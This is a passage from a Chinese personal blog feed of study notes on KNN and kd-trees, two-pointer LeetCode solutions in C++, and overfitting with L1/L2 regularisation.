punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> X_sample<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> marker<span class="token operator">=</span><span class="token string">"x"</span><span class="token punctuation">,</span>           s<span class="token operator">=</span><span class="token number">100</span><span class="token punctuation">,</span> cmap<span class="token operator">=</span><span class="token string">'cool'</span><span class="token punctuation">)</span>      <span class="token comment" spellcheck="true"># 待预测的点</span><span class="token keyword">for</span> i <span class="token keyword">in</span> neighbors<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">:</span>    plt<span class="token punctuation">.</span>plot<span class="token punctuation">(</span><span class="token punctuation">[</span>X<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> X_sample<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>X<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> X_sample<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">,</span>            <span class="token string">'k--'</span><span class="token punctuation">,</span> linewidth<span class="token operator">=</span><span class="token number">0.6</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 预测点与距离最*的10个样本的连线</span>plt<span class="token punctuation">.</span>savefig<span class="token punctuation">(</span><span class="token string">'knn_predict.png'</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/20221020180252.png" alt="最近k个"></p><p>参考链接：</p><p><a href="https://www.cnblogs.com/BlairGrowing/p/14840623.html">机器学习——K近邻算法（KNN） - 视界~ - 博客园 (cnblogs.com)</a></p><p><a href="https://www.cnblogs.com/BlairGrowing/p/15852786.html">chapter6——KNN实现 - 视界~ - 博客园 (cnblogs.com)</a></p><p><a href="https://blog.csdn.net/codedz/article/details/108862498?spm=1001.2101.3001.6650.2&utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-2-108862498-blog-115061208.pc_relevant_multi_platform_whitelistv3&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-2-108862498-blog-115061208.pc_relevant_multi_platform_whitelistv3&utm_relevant_index=5">(19条消息) KNN算法详解及实现__dingzhen的博客-CSDN博客_knn</a></p><h2 id="7-kd树"><a href="#7-kd树" class="headerlink" title="7.kd树"></a>7.kd树</h2><blockquote><p>简介</p></blockquote><p><strong>KNN算法最简单的实现方式：计算输入实例和所有训练实例的距离，进行排序，取前k个，进行分类。当训练集特别大的时候，非常耗时。</strong></p><p><strong>kd树通过减少输入实例和训练实例的计算次数来达到优化的目的</strong>.</p><blockquote><p>为什么kd树比knn 快</p></blockquote><p><strong>二叉树在时间复杂度上是O(logN），远远优于全遍历算法。对于该树，可以在空间上理解：树的每个节点把对应父节点切成的空间再切分，从而形成各个不同的子空间。查找某点的所在位置时，就变成了查找点所在子空间</strong>。</p><h3 id="1-kd-树构建"><a href="#1-kd-树构建" class="headerlink" title="1.kd 树构建"></a>1.kd 树构建</h3><blockquote><ol><li>样本空间</li></ol></blockquote><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/20221020180858.png" alt="image-20221020180916800"></p><blockquote><ol start="2"><li>步骤 一  开始</li></ol></blockquote><ol><li><strong>构造根节点：选择一个维度进行作为根节点划分==》标准：计算N个样本中每一个维度的方差，选择方差最大的 一个维度作为划分。</strong></li><li><strong>找到切分点： 假设x(1)的现在方差最大，把N个数据集的按照x(1)特征排序，从N个数据集中选择x（1）中的中位数作为切分点。</strong></li><li><strong>如何切分：切分通过切分点并垂直于x(1)坐标轴平面。</strong></li></ol><p><code>注意事项：</code></p><p><code>此时有根节点生成深度为1 的左右子节点：左子节点对应的x(1) 小于切分点，切分点小于 右子节点对应的x(1)：类似与平衡二叉树。（维度虽然很多，但是只按照x(1)特征比较）。</code></p><blockquote><ol start="3"><li>步骤二 重复</li></ol></blockquote><ol><li><strong>对深度 为m的节点，选择x(a)为切分的坐标轴，a=m( mod k)+1: 解释k为前面每一个数据的维度总数。</strong></li><li><strong>以该节点的区域中所有实例的x(a) 坐标的中位数为切分点。</strong> </li><li><strong>切分通过切分点 并于坐标轴x(a)  垂直的超平面。</strong></li></ol><p><code>注意事项：</code></p><p><code>此时有根节点生成深度为m 的左右子节点：左子节点对应的x(a) 小于切分点，切分点小于 右子节点对应的x(a)：类似与平衡二叉树。（维度虽然很多，但是只按照x(a)特征比较）。</code></p><blockquote><p> 例子</p></blockquote><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/20221020174658.png" alt="4"></p><p>参考链接：</p><p><a href="https://zhuanlan.zhihu.com/p/548175689">【十分钟 机器学习 系列课程】讲义（14）：k近邻法之kd树的构造和搜索 - 知乎 (zhihu.com)</a></p><p><a href="https://zhuanlan.zhihu.com/p/526424578">如何以案例学习kd树构建和搜索过程？ - 知乎 (zhihu.com)</a></p><h3 id="2-kd树搜索"><a href="#2-kd树搜索" class="headerlink" title="2.kd树搜索"></a>2.kd树搜索</h3><blockquote><p>kd树动态可视化参考链接</p></blockquote><p><a href="https://www.bilibili.com/video/BV1sB4y1p7Ba/?spm_id_from=333.337.search-card.all.click&vd_source=5e8f069711510b3788382a0a03ff38e5">kd树最近邻点查询运行状态可视化_哔哩哔哩_bilibili</a></p><h2 id="8-参考链接"><a href="#8-参考链接" class="headerlink" title="8.参考链接"></a>8.参考链接</h2><p><a href="https://blog.csdn.net/u010608296/article/details/119822650">(19条消息) KNN 最近邻算法（K近邻）_wangchuang2017的博客-CSDN博客_knn近邻算法</a></p><p><a href="https://blog.csdn.net/weixin_45884316/article/details/115221211">(19条消息) K-近邻算法（KNN)_的博客-CSDN博客_k近邻算法</a></p><p><a href="https://blog.csdn.net/weixin_42765557/article/details/115061208?spm=1001.2101.3001.6661.1&utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~Rate-1-115061208-blog-119822650.pc_relevant_default&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~Rate-1-115061208-blog-119822650.pc_relevant_default&utm_relevant_index=1">(19条消息) 深入浅出理解kNN（k近邻算法）_可惜剑是断的的博客-CSDN博客_knn</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 机器学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>快慢指针</title>
      <link href="/2022/10/17/%E5%BF%AB%E6%85%A2%E6%8C%87%E9%92%88%E6%B3%95/"/>
      <url>/2022/10/17/%E5%BF%AB%E6%85%A2%E6%8C%87%E9%92%88%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h1 id="快慢指针"><a href="#快慢指针" class="headerlink" title="快慢指针"></a>快慢指针</h1><h2 id="1-介绍"><a href="#1-介绍" class="headerlink" title="1.介绍"></a>1.介绍</h2><blockquote><p>简介</p></blockquote><p>双指针，指的是在<a href="https://so.csdn.net/so/search?q=%E9%81%8D%E5%8E%86&spm=1001.2101.3001.7020">遍历</a>对象的过程中，不是普通的使用单个指针<code>[或者称之为变量]</code>进行访问，而是使用<code>两个相同方向（快慢指针）或者相反方向（对撞指针）的指针</code>进行扫描，从而达到相应的目的。</p><blockquote><p>使用条件</p></blockquote><p><strong>双指针使用条件：不要使用额外的数组空间，你必须仅使用 <code>O(1)</code> 额外空间并 <a href="https://baike.baidu.com/item/%E5%8E%9F%E5%9C%B0%E7%AE%97%E6%B3%95">原地 </a>修改输入数组。</strong></p><blockquote><p>解决问题</p></blockquote><p><code>双指针类型的题目主要存在于数组，字符串，链表居多。</code></p><h2 id="2-分类"><a href="#2-分类" class="headerlink" title="2. 分类"></a>2. 分类</h2><h3 id="1-快慢指针"><a href="#1-快慢指针" class="headerlink" title="1.快慢指针"></a>1.快慢指针</h3><p><strong>快慢指针方法，又称为龟兔赛跑算法</strong>，其基本思想就是<strong>使用两个移动速度不同的指针</strong><code>(快指针是慢指针的X倍，X &gt; 1)</code>在<strong>数组或链表等序列结构上移动</strong>。这种方法对于处理<strong>「环形」链表或数组</strong>非常有用。</p><p>双指针法（快慢指针法）： <strong>通过一个快指针和慢指针在一个for循环下完成两个for循环的工作。</strong></p><p>定义快慢指针</p><ul><li>快指针：寻找新数组的元素 ，新数组就是不含有目标元素的数组</li><li>慢指针：指向更新 新数组下标的位置</li></ul><p>参考连接：<a href="https://blog.csdn.net/xiong_min/article/details/120816602?spm=1001.2101.3001.6661.1&utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~Rate-1-120816602-blog-123151269.pc_relevant_3mothn_strategy_and_data_recovery&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~Rate-1-120816602-blog-123151269.pc_relevant_3mothn_strategy_and_data_recovery&utm_relevant_index=1">(19条消息) 双指针算法原理详解_Mir_小熊同学的博客-CSDN博客</a></p><p><a href="https://programmercarl.com/0027.%E7%A7%BB%E9%99%A4%E5%85%83%E7%B4%A0.html#%E6%80%9D%E8%B7%AF">代码随想录 (programmercarl.com)</a></p><h3 id="2-对撞指针（二分法）"><a href="#2-对撞指针（二分法）" class="headerlink" title="2.对撞指针（二分法）"></a>2.对撞指针（二分法）</h3><h2 id="3-快慢指针-刷题"><a href="#3-快慢指针-刷题" class="headerlink" title="3. 快慢指针(刷题)"></a>3. 快慢指针(刷题)</h2><h3 id="27-移除元素-简单"><a href="#27-移除元素-简单" class="headerlink" title="27. 移除元素(简单)"></a><a href="https://leetcode.cn/problems/remove-element/">27. 移除元素</a>(简单)</h3><blockquote><p>题目描述</p></blockquote><pre class=" language-c++"><code class="language-c++">给你一个数组 nums 和一个值 val，你需要 原地 移除所有数值等于 val 的元素，并返回移除后数组的新长度。不要使用额外的数组空间，你必须仅使用 O(1) 额外空间并 原地 修改输入数组。元素的顺序可以改变。你不需要考虑数组中超出新长度后面的元素来源：力扣（LeetCode）链接：https://leetcode.cn/problems/remove-element著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</code></pre><blockquote><p>示例</p></blockquote><pre class=" language-c++"><code class="language-c++">示例 1：输入：nums = [3,2,2,3], val = 3输出：2, nums = [2,2]解释：函数应该返回新的长度 2, 并且 nums 中的前两个元素均为 2。你不需要考虑数组中超出新长度后面的元素。例如，函数返回的新长度为 2 ，而 nums = [2,2,3,3] 或 nums = [2,2,0,0]，也会被视作正确答案。示例 2：输入：nums = [0,1,2,2,3,0,4,2], val = 2输出：5, nums = [0,1,4,0,3]解释：函数应该返回新的长度 5, 并且 nums 中的前五个元素为 0, 1, 3, 0, 4。注意这五个元素可为任意顺序。你不需要考虑数组中超出新长度后面的元素。 提示：0 <= nums.length <= 1000 <= nums[i] <= 500 <= val <= 100通过次数861,786提交次数1,452,275来源：力扣（LeetCode）链接：https://leetcode.cn/problems/remove-element著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</code></pre><blockquote><p>题解</p></blockquote><pre class=" language-c++"><code class="language-c++">class Solution &#123;public:    int removeElement(vector<int>& nums, int val) &#123;        int slow,fast,length;        slow=fast=0;//slow 为慢指针，fast为快指针 同时指向首元素        length=nums.size();        while(fast<length)&#123;            if(nums[fast]!=val)&#123;//这里面类似于 slow是一个数组，fast 遍历原数组。把原数组的东西复制到了slow移动的数组中                nums[slow]=nums[fast];                slow++;                fast++;            &#125;else&#123;                fast++;            &#125;        &#125;        return slow;    &#125;&#125;;</code></pre><p><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gntrds6r59g30du09mnpd.gif" alt="27.移除元素-双指针法"></p><h3 id="283-移动零"><a href="#283-移动零" class="headerlink" title="283. 移动零"></a><a href="https://leetcode.cn/problems/move-zeroes/">283. 移动零</a></h3><blockquote><p>题目描述</p></blockquote><pre class=" language-c++"><code class="language-c++">给定一个数组 nums，编写一个函数将所有 0 移动到数组的末尾，同时保持非零元素的相对顺序。请注意 ，必须在不复制数组的情况下原地对数组进行操作。</code></pre><blockquote><p>示例</p></blockquote><pre class=" language-c++"><code class="language-c++">示例 1:输入: nums = [0,1,0,3,12]输出: [1,3,12,0,0]示例 2:输入: nums = [0]输出: [0] </code></pre><blockquote><p>解法1 （双指针两次遍历）</p></blockquote><pre class=" language-c++"><code class="language-c++">class Solution &#123;public:    void moveZeroes(vector<int>& nums) &#123;                              int slow,fast,length;        slow=fast=0;        length=nums.size();        while(fast<length)&#123;//循环终止条件            if(nums[fast]!=0)&#123;//和27.移除目标元素相同                nums[slow]=nums[fast];                slow++;                fast++;            &#125;            else&#123;                fast++;            &#125;        &#125;        while(slow<length)//27.移除相同元素，返回的是移除后的大小，这道题最后自动补零        &#123;            nums[slow]=0;            slow++;          &#125;                 &#125;&#125;;</code></pre><blockquote><p>解法2 （借鉴了快速排序的思想）</p></blockquote><p><strong>快速排序的思想</strong>：<strong>快速排序</strong>首先要<strong>确定一个待分割的元素做中间点x</strong>，然后把<strong>所有小于等于x的元素放到x的左边，大于x的元素放到其右边。</strong></p><p><strong>简单描述：（x的左边都小于等于x，右边都大于x)</strong></p><p><strong>思路：</strong></p><p>这里我们可以<strong>用0当做这个中间点</strong>，<strong>把不等于0</strong>(注意题目<strong>没说不能有负数</strong>)的<strong>放到中间点的左边，等于0的放到其右边。</strong><br>这的中间点就是0本身，所以实现起来比快速排序简单很多，我们使用两个指针i和j，只要nums[i]!=0，我们就交换nums[i]和nums[j]</p><pre class=" language-c++"><code class="language-c++">class Solution &#123;public:    void moveZeroes(vector<int>& nums) &#123;                             int slow,fast,length;        slow=fast=0;        length=nums.size();        while(fast<length)&#123;            if(nums[fast]!=0)&#123;               int temp=nums[fast];               nums[fast]=nums[slow];               nums[slow]=temp;               slow++;            &#125;            fast++;                 &#125;           &#125;&#125;;</code></pre><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/20221018115833.gif" alt="quickandtwo"></p><p>参考链接：<a href="https://leetcode.cn/problems/move-zeroes/solution/dong-hua-yan-shi-283yi-dong-ling-by-wang_ni_ma/">动画演示 283.移动零 - 移动零 - 力扣（LeetCode）</a></p><h3 id="844-比较含退格的字符串-尾到头"><a href="#844-比较含退格的字符串-尾到头" class="headerlink" title="844. 比较含退格的字符串(尾到头)"></a><a href="https://leetcode.cn/problems/backspace-string-compare/">844. 比较含退格的字符串</a>(尾到头)</h3><blockquote><p>题目详情</p></blockquote><pre class=" language-c++"><code class="language-c++">给定 s 和 t 两个字符串，当它们分别被输入到空白的文本编辑器后，如果两者相等，返回 true 。# 代表退格字符。注意：如果对空文本输入退格字符，文本继续为空。 来源：力扣（LeetCode）链接：https://leetcode.cn/problems/backspace-string-compare著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</code></pre><blockquote><p>示例</p></blockquote><pre class=" language-c++"><code class="language-c++">给定 s 和 t 两个字符串，当它们分别被输入到空白的文本编辑器后，如果两者相等，返回 true 。# 代表退格字符。注意：如果对空文本输入退格字符，文本继续为空。 示例 1：输入：s = "ab#c", t = "ad#c"输出：true解释：s 和 t 都会变成 "ac"。示例 2：输入：s = "ab##", t = "c#d#"输出：true解释：s 和 t 都会变成 ""。示例 3：输入：s = "a#c", t = "b"输出：false解释：s 会变成 "c"，但 t 仍然是 "b"。 提示：1 <= s.length, t.length <= 200s 和 t 只含有小写字母以及字符 '#' 进阶：你可以用 O(n) 的时间复杂度和 O(1) 的空间复杂度解决该问题吗？来源：力扣（LeetCode）链接：https://leetcode.cn/problems/backspace-string-compare著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</code></pre><blockquote><p>题解1  （栈）</p></blockquote><pre class=" language-c++"><code class="language-c++">class Solution &#123;public:    bool backspaceCompare(string S, string T) &#123;        return build(S) == build(T);    &#125;    string build(string str) &#123;        string ret;        for (char ch : str) &#123;            if (ch != '#') &#123;                ret.push_back(ch);            &#125; else if (!ret.empty()) &#123;                ret.pop_back();            &#125;        &#125;        return ret;    &#125;&#125;;</code></pre><pre class=" language-c++"><code class="language-c++">复杂度分析:时间复杂度：O(N+M)，其中 N 和 M 分别为字符串 S 和 T 的长度。我们需要遍历两字符串各一次。空间复杂度：O(N+M)，其中 N和 M 分别为字符串 S 和 T 的长度。主要为还原出的字符串的开销。</code></pre><blockquote><p>题解2 （双指针）</p></blockquote><pre class=" language-c++"><code class="language-c++">我将介绍一种常量级空间复杂度的解法：双指针，并且比官方解思路更简单清晰！由于 # 号只会消除左边的一个字符，所以对右边的字符无影响，所以我们选择从后往前遍历 S，T 字符串。思路解析：准备两个指针 i, j 分别指向 S，T 的末位字符，再准备两个变量 skipS，skipT 来分别存放 S，T 字符串中的 # 数量。从后往前遍历 S，所遇情况有三，如下所示：    2.1 若当前字符是 #，则 skipS 自增 1；    2.2 若当前字符不是 #，且 skipS 不为 0，则 skipS自减 1；    2.3 若当前字符不是 #，且 skipS 为 0，则代表当前字符不会被消除，我们可以用来和 T 中的当前字符作比较。若对比过程出现 S, T 当前字符不匹配，则遍历结束，返回 false，若 S，T 都遍历结束，且都能一一匹配，则返回 true。</code></pre><pre class=" language-c++"><code class="language-c++">class Solution &#123;public:    bool backspaceCompare(string s, string t) &#123;        int SkipS,SkipT;        SkipS=SkipT=0;        int i,j;        i=s.size()-1;        j=t.size()-1;        while(i>=0 || j>=0)&#123;            // 先找到 s 中第一个需要比较的字符（即去除 # 影响后的第一个待比较字符）            while(i>=0)&#123;                if(s[i]=='#')&#123;                    SkipS++;                    i--;                &#125;else if(SkipS>0)&#123;                    SkipS--;                    i--;                &#125;else&#123;                    break;                &#125;            &#125;              // 再找到 t 中第一个需要比较的字符（即去除 # 影响后的第一个待比较字符）            while(j>=0)&#123;                if(t[j]=='#')&#123;                    SkipT++;                    j--;                &#125;else if( SkipT>0)&#123;                    SkipT--;                    j--;                &#125;else&#123;                    break;                &#125;            &#125;            // 然后开始比较,注意有下面这个 if 条件的原因是：如果 index = 0 位置上为 '#'，则 i, j 会为 -1            // 而 index = -1 的情况应当处理。            // (i >= 0 && j >= 0) 为 false 情况为            if(i>=0&&j>=0)&#123;                if(s[i]!=t[j])                    return false;            &#125;            // 1. i < 0 && j >= 0            // 2. j < 0 && i >= 0            // 3. i < 0 && j < 0            // 其中，第 3 种情况为符合题意情况，因为这种情况下 s 和 t 都是 index = 0 的位置为 '#' 而这种情况下            // 退格空字符即为空字符，也符合题意，应当返回 True。            // 但是，情况 1 和 2 不符合题意，因为 s 和 t 其中一个是在 index >= 0 处找到了待比较字符，另一个没有找到            // 这种情况显然不符合题意，应当返回 False，下式便处理这种情况。                        else if(i>=0||j>=0)&#123;                return false;            &#125;                        i--;            j--;        &#125;        return true;    &#125;&#125;;</code></pre><pre class=" language-c++"><code class="language-c++">复杂度分析时间复杂度：O(N+M)其中 N 和 M分别为字符串 S 和 T 的长度。我们需要遍历两字符串各一次。空间复杂度：O(1)。对于每个字符串，我们只需要定义一个指针和一个计数器即可</code></pre><p>作者：LeetCode-Solution<br>链接：<a href="https://leetcode.cn/problems/backspace-string-compare/solution/bi-jiao-han-tui-ge-de-zi-fu-chuan-by-leetcode-solu/">https://leetcode.cn/problems/backspace-string-compare/solution/bi-jiao-han-tui-ge-de-zi-fu-chuan-by-leetcode-solu/</a><br>来源：力扣（LeetCode）<br>著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</p><p>参考连接：</p><p><a href="https://leetcode.cn/problems/backspace-string-compare/solution/shuang-zhi-zhen-bi-jiao-han-tui-ge-de-zi-8fn8/">【双指针】比较含退格的字符串 - 比较含退格的字符串 - 力扣（LeetCode）</a></p><p><a href="https://leetcode.cn/problems/backspace-string-compare/solution/bi-jiao-han-tui-ge-de-zi-fu-chuan-by-leetcode-solu/">比较含退格的字符串 - 比较含退格的字符串 - 力扣（LeetCode）</a></p><p><code>注意事项：</code></p><p><strong>这个双指针和以往（27，283，80）不同 ：</strong></p><ol><li><strong>两个指针作用在两个数组</strong></li><li><strong>指针遍历方向从尾部到头部</strong></li></ol><h3 id="80-删除有序数组中的重复项-II-中等"><a href="#80-删除有序数组中的重复项-II-中等" class="headerlink" title="80. 删除有序数组中的重复项 II(中等)"></a><a href="https://leetcode.cn/problems/remove-duplicates-from-sorted-array-ii/">80. 删除有序数组中的重复项 II</a>(中等)</h3><blockquote><p>题目描述信息</p></blockquote><pre class=" language-c++"><code class="language-c++">给你一个有序数组 nums ，请你 原地 删除重复出现的元素，使得出现次数超过两次的元素只出现两次 ，返回删除后数组的新长度。不要使用额外的数组空间，你必须在 原地 修改输入数组 并在使用 O(1) 额外空间的条件下完成。来源：力扣（LeetCode）链接：https://leetcode.cn/problems/remove-duplicates-from-sorted-array-ii著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</code></pre><blockquote><p>示例</p></blockquote><pre class=" language-c++"><code class="language-c++">示例 1：输入：nums = [1,1,1,2,2,3]输出：5, nums = [1,1,2,2,3]解释：函数应返回新长度 length = 5, 并且原数组的前五个元素被修改为 1, 1, 2, 2, 3 。 不需要考虑数组中超出新长度后面的元素。示例 2：输入：nums = [0,0,1,1,1,1,2,3,3]输出：7, nums = [0,0,1,1,2,3,3]解释：函数应返回新长度 length = 7, 并且原数组的前五个元素被修改为 0, 0, 1, 1, 2, 3, 3 。 不需要考虑数组中超出新长度后面的元素。 提示：1 <= nums.length <= 3 * 104-104 <= nums[i] <= 104nums 已按升序排列来源：力扣（LeetCode）链接：https://leetcode.cn/problems/remove-duplicates-from-sorted-array-ii著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</code></pre><blockquote><p>题解</p></blockquote><pre class=" language-c++"><code class="language-c++">class Solution &#123;public:    int removeDuplicates(vector<int>& nums) &#123;       return removeDuplicateNum(nums,2);//     &#125;    /*   通用解法   */    int removeDuplicateNum(vector<int> & nums,int k)&#123;//当出现重复数字 个数大于k个时候，保留k个        int length=nums.size();//计算当前 数组大小        if(length<=k)//如果当前数据大小小于等于k,就直接返回数组的大小            return length;        /* 当前数组大小大于k时候，直接fast从第k+1个开始         对应的下表是k (0,1,2,3,....,k),slow为 数组中第k个元素*/        int slow,fast;        slow=k-1;//        fast=k;        while(fast<length)&#123;            if(nums[fast]!=nums[slow+1-k])&#123;                /*                要保留k个相同的数据，fast要和slow下一次写入位置的第前k个值相比较                slow下一次写入位置为slow+1 ,故其前第k个值为slow+1-k;                */                nums[slow+1]=nums[fast];                slow++;            &#125;            fast++;        &#125;        return slow+1;    &#125;&#125;;</code></pre><p>参考链接：<a href="https://leetcode.cn/problems/remove-duplicates-from-sorted-array/solution/shua-chuan-lc-jian-ji-shuang-zhi-zhen-ji-2eg8/">【宫水三叶】一题双解 :「双指针」&amp;「通用」解法 - 删除有序数组中的重复项 - 力扣（LeetCode）</a></p><h3 id="27和80小总结"><a href="#27和80小总结" class="headerlink" title="27和80小总结"></a>27和80小总结</h3><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/20221018104743.png" alt="image-20221018104743587"></p><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/20221018104515.png" alt="image-20221018104515143"></p><h2 id="4-对撞指针"><a href="#4-对撞指针" class="headerlink" title="4.对撞指针"></a>4.对撞指针</h2><h3 id="977-有序数组的平方"><a href="#977-有序数组的平方" class="headerlink" title=" 977. 有序数组的平方"></a><a href="https://leetcode.cn/problems/squares-of-a-sorted-array/"> 977. 有序数组的平方</a></h3><blockquote><p>题目描述</p></blockquote><pre class=" language-c++"><code class="language-c++">给你一个按 非递减顺序 排序的整数数组 nums，返回 每个数字的平方 组成的新数组，要求也按 非递减顺序 排序。</code></pre><blockquote><p>示例</p></blockquote><pre class=" language-c++"><code class="language-c++">示例 1：输入：nums = [-4,-1,0,3,10]输出：[0,1,9,16,100]解释：平方后，数组变为 [16,1,0,9,100]排序后，数组变为 [0,1,9,16,100]示例 2：输入：nums = [-7,-3,2,3,11]输出：[4,9,9,49,121]来源：力扣（LeetCode）链接：https://leetcode.cn/problems/squares-of-a-sorted-array著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</code></pre><blockquote><p>题解</p></blockquote><pre class=" language-c++"><code class="language-c++">class Solution &#123;public:    vector<int> sortedSquares(vector<int>& nums) &#123;       int l,r,k;       l=0;       k=r=nums.size()-1;       vector<int>result(nums.size(), 0);//定义一个新的数组存储保存平方的数据        while(l<=r)&#123;           int l2=nums[l]*nums[l];           int r2=nums[r]*nums[r];            if(l2>r2)&#123;//l左边指针的值小于r右边指针的值 把最大的存储到新数组result末尾。然后l++.                result[k]=l2;                k--;                l++;            &#125;else&#123;                result[k]=r2;                k--;                r--;            &#125;        &#125;        return result;    &#125;&#125;;</code></pre><p>参考链接：</p><p><a href="https://leetcode.cn/problems/squares-of-a-sorted-array/solution/you-xu-shu-zu-de-ping-fang-by-leetcode-solution/">有序数组的平方 - 有序数组的平方 - 力扣（LeetCode）</a></p><p><a href="https://leetcode.cn/problems/squares-of-a-sorted-array/solution/acm-xuan-shou-tu-jie-leetcode-you-xu-shu-h8le/">977. 有序数组的平方 题解 - 力扣（LeetCode）</a></p><blockquote><p>复杂度分析</p></blockquote><pre class=" language-c++"><code class="language-c++">时间复杂度：O(n)，其中 n 是数组 nums 的长度。空间复杂度：O(1)。除了存储答案的数组以外，我们只需要维护常量空间。作者：LeetCode-Solution链接：https://leetcode.cn/problems/squares-of-a-sorted-array/solution/you-xu-shu-zu-de-ping-fang-by-leetcode-solution/来源：力扣（LeetCode）著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> leetcode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>过拟合和欠拟合</title>
      <link href="/2022/10/14/%E8%BF%87%E6%8B%9F%E5%90%88%E5%92%8C%E6%AC%A0%E6%8B%9F%E5%90%88/"/>
      <url>/2022/10/14/%E8%BF%87%E6%8B%9F%E5%90%88%E5%92%8C%E6%AC%A0%E6%8B%9F%E5%90%88/</url>
      
        <content type="html"><![CDATA[<h2 id="过拟合"><a href="#过拟合" class="headerlink" title="过拟合"></a>过拟合</h2><h3 id="1-定义"><a href="#1-定义" class="headerlink" title="1.定义"></a>1.定义</h3><p><a href="https://so.csdn.net/so/search?q=%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0&spm=1001.2101.3001.7020">机器学习</a>模型在一批数据上过于纠结误差值，想要将误差降到最低。然而当此模型运用到<strong>现实数据或者说测试数据上，误差值变高，泛化能力差，不能表达除训练数据以外的其他数据</strong>，这就叫做过拟合。如<strong>红线</strong></p><p><strong>简单表达：模型过于复杂（参数个数太多和参数太过于复杂），训练集表现好，真实数据或者测试集表现差</strong> </p><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/20221014202437.png" alt="image-20221014202430690"></p><h3 id="2-解决办法"><a href="#2-解决办法" class="headerlink" title="2.解决办法"></a>2.解决办法</h3><p>为了减小或者避免过拟合现象。通常在<strong>原始的损失函数之后</strong>附加上<strong>正则项</strong>，通常使用的正则项有两种:<strong>L1正则化</strong>和<strong>L2正则化</strong>。</p><h4 id="1-L1正则化"><a href="#1-L1正则化" class="headerlink" title="1. L1正则化"></a>1. L1正则化</h4><p>$$<br>\frac{1}{N}\sum_{1}^{N}  (f(x_i)-y_i)^2+\lambda ||\omega ||_1\<br>||w||_1=|w_1|+|w_2|+…..+|w_l|&lt;= \theta<br>$$</p><p><strong>L1正则化项是指权重向量w 中各元素的绝对值之和，表示为 <img src="https://gitee.com/hexofox/foximage/raw/master/images/20221014211939.png" alt="image-20221014211939181"></strong></p><p><strong>需要注意的是||w||1是有个范围限制。</strong></p><p><strong>原始的损失函数，也称为经验误差</strong>，在此基础上，<strong>加入了L1正则项</strong></p><p> <strong>,L1正则项是权重向量中各元素的绝对值之和，所造成的一个后果就是损失函数不是完全可微</strong>。<strong>模型训练的目的是令损失函数达到全局最小值，当在原始的损失函数之后加入L1正则项之后，相当于对权重向量做了约束，此时我们的任务变为了在L1约束条件下求得损失函数的最小值。</strong></p><blockquote><p>L1正则为何会造成 稀疏</p></blockquote><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/20221014213955.png" alt="image-20221014213955027"></p><p><strong>因为L1函数有很多突出的顶点（</strong>二维情况下四个，多维情况下更多），<strong>彩色等值线与这些角接触的机率会远大于与黑色图形其它部位接触的机率，</strong>而在这些角上<strong>，会有很多权值等于0</strong>，<strong>这就是为什么L1正则化可以产生稀疏效果，进而可以用于特征选择。正则化系数λ可以控制黑色图形的大小，λ越大，黑色图形越小，λ 越小，黑色图形越大。λ 越大，表示对权重向量的限制作用越强</strong></p><p>原文链接：<a href="https://blog.csdn.net/weixin_42469716/article/details/109124448">https://blog.csdn.net/weixin_42469716/article/details/109124448</a></p><h4 id="2-L2正则化"><a href="#2-L2正则化" class="headerlink" title="2.L2正则化"></a>2.L2正则化</h4><p>$$<br>\frac{1}{N}\sum_{1}^{N}  (f(x_i)-y_i)^2+\lambda ||\omega ||_2 ^2\<br>||w||_2^2=|w_1|^2+|w_2|^2+…..+|w_l|^2<br>$$</p><p><strong>L2正则化项是指权重向量w中各个元素的平方和，表示为 